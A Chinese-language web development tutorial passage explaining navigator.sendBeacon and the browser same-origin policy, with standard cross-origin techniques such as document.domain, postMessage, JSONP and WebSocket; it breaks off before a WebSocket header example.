<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;unload&#x27;</span>, logData, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logData</span>(<span class="params"></span>) &#123;</span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(<span class="string">&#x27;/log&#x27;</span>, analyticsData); <span class="comment">// 参数一：url，参数二：所要发送的数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Navigator.sendBeacon</code>方法<strong>接受两个参数</strong>，第一个参数是<strong>目标服务器的 URL</strong>，第二个参数是<strong>所要发送的数据</strong>（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.<span class="title function_">sendBeacon</span>(url, data)  <span class="comment">// 参数一：url，参数二：所要发送的数据</span></span><br></pre></td></tr></table></figure>

<p>这个方法的<strong>返回值是一个布尔值，成功发送数据为<code>true</code>，否则为<code>false</code>。</strong></p>
<p>该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body onload=&quot;analytics(&#x27;start&#x27;)&quot; onunload=&quot;analytics(&#x27;end&#x27;)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">analytics</span>(<span class="params">state</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!navigator.<span class="property">sendBeacon</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> <span class="variable constant_">URL</span> = <span class="string">&#x27;http://example.com/analytics&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">&#x27;state=&#x27;</span> + state + <span class="string">&#x27;&amp;location=&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>;</span><br><span class="line">  navigator.<span class="title function_">sendBeacon</span>(<span class="variable constant_">URL</span>, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="六、同源限制"><a href="#六、同源限制" class="headerlink" title="六、同源限制"></a>六、同源限制</h2><p> <strong>浏览器安全的基石是“同源政策”</strong>（<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Same-origin_policy">same-origin policy</a>）。很多开发者都知道这一点，但了解得不全面。 </p>
<h3 id="1、概述-2"><a href="#1、概述-2" class="headerlink" title="1、概述"></a>1、概述</h3><h4 id="1-1-含义"><a href="#1-1-含义" class="headerlink" title="1.1 含义"></a>1.1 含义</h4><p>1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。</p>
<p>最初，它的含义是指，A 网页设置的 Cookie，B 网页不能打开，除非这两个网页“同源”。<strong>所谓“同源”指的是“三个相同”。</strong></p>
<blockquote>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
</blockquote>
<p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略），它的同源情况如下。</p>
<ul>
<li><code>http://www.example.com/dir2/other.html</code>：同源</li>
<li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li>
<li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li>
<li><code>https://www.example.com/dir/page.html</code>：不同源（协议不同）</li>
</ul>
<h4 id="1-2-目的"><a href="#1-2-目的" class="headerlink" title="1.2 目的"></a>1.2 目的</h4><p>同源政策的目的，<strong>是为了保证用户信息的安全</strong>，防止恶意的网站窃取数据。</p>
<p>设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 Cookie，包含了一些隐私信息（比如存款总额）。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 Cookie，那么隐私信息就会泄漏。更可怕的是，Cookie 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p>
<p>由此可见，同源政策是必需的，否则 Cookie 可以共享，互联网就毫无安全可言了。</p>
<h4 id="1-3-限制范围"><a href="#1-3-限制范围" class="headerlink" title="1.3 限制范围"></a>1.3 限制范围</h4><p>随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。</p>
<blockquote>
<p>（1） 无法读取非同源网页的 Cookie、LocalStorage 和 IndexedDB。</p>
<p>（2） 无法接触非同源网页的 DOM。</p>
<p>（3） 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。</p>
</blockquote>
<p>另外，通过 JavaScript 脚本可以拿到其他窗口的<code>window</code>对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的<code>window</code>对象的九个属性和四个方法。</p>
<ul>
<li>window.closed</li>
<li>window.frames</li>
<li>window.length</li>
<li>window.location</li>
<li>window.opener</li>
<li>window.parent</li>
<li>window.self</li>
<li>window.top</li>
<li>window.window</li>
<li>window.blur()</li>
<li>window.close()</li>
<li>window.focus()</li>
<li>window.postMessage()</li>
</ul>
<p>上面的九个属性之中，只有<code>window.location</code>是可读写的，其他八个全部都是只读。而且，即使是<code>location</code>对象，非同源的情况下，也只允许调用<code>location.replace</code>方法和写入<code>location.href</code>属性。</p>
<p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。</p>
<h3 id="2、Cookie"><a href="#2、Cookie" class="headerlink" title="2、Cookie"></a>2、Cookie</h3><p>Cookie 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p>
<p>举例来说，A 网页的网址是<code>http://w1.example.com/a.html</code>，B 网页的网址是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享 Cookie。因为浏览器通过<code>document.domain</code>属性来检查是否同源。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 两个网页都需要设置</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>注意，A 和 B 两个网页都需要设置<code>document.domain</code>属性，才能达到同源的目的。因为设置<code>document.domain</code>的同时，会把端口重置为<code>null</code>，因此如果只设置一个网页的<code>document.domain</code>，会导致两个网址的端口不同，还是达不到同源的目的。</p>
<p>现在，A 网页通过脚本设置一个 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;test1=hello&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>B 网页就可以读到这个 Cookie。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> allCookie = <span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure>

<p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexedDB 无法通过这种方法，规避同源政策，而要使用下文介绍 PostMessage API。</p>
<p>另外，服务器也可以在设置 Cookie 的时候，指定 Cookie 的所属域名为一级域名，比如<code>.example.com</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Set</span>-<span class="title class_">Cookie</span>: key=value; domain=.<span class="property">example</span>.<span class="property">com</span>; path=/</span><br></pre></td></tr></table></figure>

<p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个 Cookie。</p>
<h3 id="3、iframe-和多窗口通信"><a href="#3、iframe-和多窗口通信" class="headerlink" title="3、iframe 和多窗口通信"></a>3、iframe 和多窗口通信</h3><p><code>iframe</code>元素可以在当前网页之中，嵌入其他网页。每个<code>iframe</code>元素形成自己的窗口，即有自己的<code>window</code>对象。<code>iframe</code>窗口之中的脚本，可以获得父窗口和子窗口。但是，只有在同源的情况下，父窗口和子窗口才能通信；如果跨域，就无法拿到对方的 DOM。</p>
<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span></span><br><span class="line">.<span class="title function_">getElementById</span>(<span class="string">&quot;myIFrame&quot;</span>)</span><br><span class="line">.<span class="property">contentWindow</span></span><br><span class="line">.<span class="property">document</span></span><br><span class="line"><span class="comment">// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span></span><br></pre></td></tr></table></figure>

<p>上面命令中，父窗口想获取子窗口的 DOM，因为跨域导致报错。</p>
<p>反之亦然，子窗口获取主窗口的 DOM 也会报错。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">document</span>.<span class="property">body</span></span><br><span class="line"><span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<p>这种情况不仅适用于<code>iframe</code>窗口，还适用于<code>window.open</code>方法打开的窗口，只要跨域，父窗口与子窗口之间就无法通信。</p>
<p>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源政策，拿到 DOM。</p>
<p>对于完全不同源的网站，目前有两种方法，可以解决跨域窗口的通信问题。</p>
<blockquote>
<ul>
<li>片段识别符（fragment identifier）</li>
<li>跨文档通信API（Cross-document messaging）</li>
</ul>
</blockquote>
<h4 id="3-1-片段识别符"><a href="#3-1-片段识别符" class="headerlink" title="3.1 片段识别符"></a>3.1 片段识别符</h4><p>片段标识符（fragment identifier）指的是，URL 的<code>#</code>号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>
<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> src = originURL + <span class="string">&#x27;#&#x27;</span> + data;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIFrame&#x27;</span>).<span class="property">src</span> = src;</span><br></pre></td></tr></table></figure>

<p>上面代码中，父窗口把所要传递的信息，写入 iframe 窗口的片段标识符。</p>
<p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onhashchange</span> = checkMessage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkMessage</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.<span class="property">location</span>.<span class="property">href</span> = target + <span class="string">&#x27;#&#x27;</span> + hash;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-window-postMessage"><a href="#3-2-window-postMessage" class="headerlink" title="3.2 window.postMessage()"></a>3.2 window.postMessage()</h4><p>上面的这种方法属于破解，HTML5 为了解决这个问题，引入了一个全新的API：跨文档通信 API（Cross-document messaging）。</p>
<p>这个 API 为<code>window</code>对象新增了一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口<code>aaa.com</code>向子窗口<code>bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父窗口打开一个子窗口</span></span><br><span class="line"><span class="keyword">var</span> popup = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://bbb.com&#x27;</span>, <span class="string">&#x27;title&#x27;</span>);</span><br><span class="line"><span class="comment">// 父窗口向子窗口发消息</span></span><br><span class="line">popup.<span class="title function_">postMessage</span>(<span class="string">&#x27;Hello World!&#x27;</span>, <span class="string">&#x27;http://bbb.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即“协议 + 域名 + 端口”。也可以设为<code>*</code>，表示不限制域名，向所有窗口发送。</p>
<p>子窗口向父窗口发送消息的写法类似。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子窗口向父窗口发消息</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">opener</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;Nice to see you&#x27;</span>, <span class="string">&#x27;http://aaa.com&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>父窗口和子窗口都可以通过<code>message</code>事件，监听对方的消息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 父窗口和子窗口都可以用下面的代码，</span></span><br><span class="line"><span class="comment">// 监听 message 消息</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p><code>message</code>事件的参数是事件对象<code>event</code>，提供以下三个属性。</p>
<blockquote>
<ul>
<li><code>event.source</code>：发送消息的窗口</li>
<li><code>event.origin</code>: 消息发向的网址</li>
<li><code>event.data</code>: 消息内容</li>
</ul>
</blockquote>
<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, receiveMessage);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">receiveMessage</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  event.<span class="property">source</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;Nice to see you!&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码有几个地方需要注意。首先，<code>receiveMessage</code>函数里面没有过滤信息的来源，任意网址发来的信息都会被处理。其次，<code>postMessage</code>方法中指定的目标窗口的网址是一个星号，表示该信息可以向任意网址发送。通常来说，这两种做法是不推荐的，因为不够安全，可能会被恶意利用。</p>
<p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, receiveMessage);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">receiveMessage</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">origin</span> !== <span class="string">&#x27;http://aaa.com&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (event.<span class="property">data</span> === <span class="string">&#x27;Hello World&#x27;</span>) &#123;</span><br><span class="line">    event.<span class="property">source</span>.<span class="title function_">postMessage</span>(<span class="string">&#x27;Hello&#x27;</span>, event.<span class="property">origin</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">data</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-3-LocalStorage"><a href="#3-3-LocalStorage" class="headerlink" title="3.3 LocalStorage"></a>3.3 LocalStorage</h4><p>通过<code>window.postMessage</code>，读写其他窗口的 LocalStorage 也成为了可能。</p>
<p>下面是一个例子，主窗口写入 iframe 子窗口的<code>localStorage</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">origin</span> !== <span class="string">&#x27;http://bbb.com&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> payload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(e.<span class="property">data</span>);</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(payload.<span class="property">key</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload.<span class="property">data</span>));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，子窗口将父窗口发来的消息，写入自己的 LocalStorage。</p>
<p>父窗口发送消息的代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;iframe&#x27;</span>)[<span class="number">0</span>].<span class="property">contentWindow</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span> &#125;;</span><br><span class="line">win.<span class="title function_">postMessage</span>(</span><br><span class="line">  <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">key</span>: <span class="string">&#x27;storage&#x27;</span>, <span class="attr">data</span>: obj&#125;),</span><br><span class="line">  <span class="string">&#x27;http://bbb.com&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>加强版的子窗口接收消息的代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">origin</span> !== <span class="string">&#x27;http://bbb.com&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">var</span> payload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(e.<span class="property">data</span>);</span><br><span class="line">  <span class="keyword">switch</span> (payload.<span class="property">method</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;set&#x27;</span>:</span><br><span class="line">      <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(payload.<span class="property">key</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(payload.<span class="property">data</span>));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">      <span class="keyword">var</span> parent = <span class="variable language_">window</span>.<span class="property">parent</span>;</span><br><span class="line">      <span class="keyword">var</span> data = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(payload.<span class="property">key</span>);</span><br><span class="line">      parent.<span class="title function_">postMessage</span>(data, <span class="string">&#x27;http://aaa.com&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;remove&#x27;</span>:</span><br><span class="line">      <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(payload.<span class="property">key</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>加强版的父窗口发送消息代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> win = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;iframe&#x27;</span>)[<span class="number">0</span>].<span class="property">contentWindow</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// 存入对象</span></span><br><span class="line">win.<span class="title function_">postMessage</span>(</span><br><span class="line">  <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">key</span>: <span class="string">&#x27;storage&#x27;</span>, <span class="attr">method</span>: <span class="string">&#x27;set&#x27;</span>, <span class="attr">data</span>: obj&#125;),</span><br><span class="line">  <span class="string">&#x27;http://bbb.com&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// 读取对象</span></span><br><span class="line">win.<span class="title function_">postMessage</span>(</span><br><span class="line">  <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">key</span>: <span class="string">&#x27;storage&#x27;</span>, <span class="attr">method</span>: <span class="string">&quot;get&quot;</span>&#125;),</span><br><span class="line">  <span class="string">&quot;*&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">origin</span> != <span class="string">&#x27;http://aaa.com&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(e.<span class="property">data</span>).<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="4、AJAX"><a href="#4、AJAX" class="headerlink" title="4、AJAX"></a>4、AJAX</h3><p>同源政策规定，AJAX 请求只能发给同源的网址，否则就报错。</p>
<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>
<blockquote>
<ul>
<li>JSONP</li>
<li>WebSocket</li>
<li>CORS</li>
</ul>
</blockquote>
<h4 id="4-1-JSONP"><a href="#4-1-JSONP" class="headerlink" title="4.1 JSONP"></a>4.1 JSONP</h4><p>JSONP 是服务器与客户端跨源通信的常用方法。最大特点就是简单易用，没有兼容性问题，老式浏览器全部支持，服务端改造非常小。</p>
<p>它的做法如下。</p>
<p>第一步，网页添加一个<code> &lt;script&gt; </code>元素，向服务器请求一个脚本，这不受同源政策限制，可以跨域请求。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://api.foo.com?callback=bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意，请求的脚本网址有一个<code>callback</code>参数（<code>?callback=bar</code>），用来告诉服务器，客户端的回调函数名称（<code>bar</code>）。</p>
<p>第二步，服务器收到请求后，拼接一个字符串，将 JSON 数据放在函数名里面，作为字符串返回（<code>bar(&#123;...&#125;)</code>）。</p>
<p>第三步，客户端会将服务器返回的字符串，作为代码解析，因为浏览器认为，这是<code> &lt;script&gt; </code>标签请求的脚本内容。这时，客户端只要定义了<code>bar()</code>函数，就能在该函数体内，拿到服务器返回的 JSON 数据。</p>
<p>下面看一个实例。首先，网页动态插入<code> &lt;script&gt; </code>元素，由它向跨域网址发出请求。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addScriptTag</span>(<span class="params">src</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  script.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">  script.<span class="property">src</span> = src;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">addScriptTag</span>(<span class="string">&#x27;http://example.com/ip?callback=foo&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Your public IP address is: &#x27;</span> + data.<span class="property">ip</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码通过动态添加<code> &lt;script&gt; </code>元素，向服务器<code>example.com</code>发出请求。注意，该请求的查询字符串有一个<code>callback</code>参数，用来指定回调函数的名字，这对于 JSONP 是必需的。</p>
<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">foo</span>(&#123;</span><br><span class="line">  <span class="string">&#x27;ip&#x27;</span>: <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>由于<code> &lt;script&gt; </code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的 JSON 数据被视为 JavaScript 对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>
<h4 id="4-2-WebSocket"><a href="#4-2-WebSocket" class="headerlink" title="4.2 WebSocket"></a>4.2 WebSocket</h4><p>WebSocket 是一种<strong>通信协议</strong>，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。<strong>该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信</strong>。</p>
<p>下面是一个例子，浏览器发出的 WebSocket 请求的头信息（摘自<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/WebSocket">维基百科</a>）。</p>
